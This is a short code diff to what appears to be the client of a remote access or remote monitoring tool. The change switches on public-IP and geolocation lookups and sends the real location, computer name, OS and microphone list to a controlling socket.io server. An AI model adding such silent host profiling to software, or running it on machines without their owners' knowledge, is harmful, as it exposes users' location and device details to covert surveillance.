@@ -147,8 +147,8 @@ def connect():
     
     print('connection established')
     
-    # clientData["ip"] = get('https://api64.ipify.org?format=json').json()['ip']
-    # clientData["loc"] = get(f'https://ipapi.co/{clientData["ip"]}/json/').json()
+    clientData["ip"] = get('https://api64.ipify.org?format=json').json()['ip']
+    clientData["loc"] = get(f'https://ipapi.co/{clientData["ip"]}/json/').json()
 
 
     deviceString = dxcam.output_info()
@@ -162,11 +162,9 @@ def connect():
     micList[defaultIndex] = "!!!" + micList[defaultIndex]
 
     sio.emit('newClient', [{'name': os.environ["COMPUTERNAME"],
-                            "ip":"192.168.1.1",
-                            # "ip":clientData["ip"],
+                            "ip":clientData["ip"],
                             "os":f"{platform.system()} {platform.release()}",
-                            "loc":'bla France',
-                            # "loc":f'{clientData["loc"].get("city")} {clientData["loc"].get("country_name")}',
+                            "loc":f'{clientData["loc"].get("city")} {clientData["loc"].get("country_name")}',
                             "ping":"0",
                             "idleTime":"Not idle",
                             "upTime":"00:00:00",
